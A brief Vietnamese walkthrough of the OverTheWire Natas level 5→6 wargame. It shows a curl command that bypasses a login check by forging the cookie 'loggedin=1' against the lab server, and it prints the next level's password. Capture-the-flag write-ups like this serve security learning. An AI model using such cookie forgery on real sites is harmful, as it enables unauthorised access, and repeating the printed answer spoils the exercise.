# Natas 5 → 6

## Mục tiêu

Vượt kiểm tra cookie.

## Tôi thấy

Đổi loggedin thành 1 cho response thành công.

## Cách làm

```bash
curl -u natas5:<password> -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

Server tin cookie do client kiểm soát.

## Kết quả

Password của `natas6`:

```text
7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
```
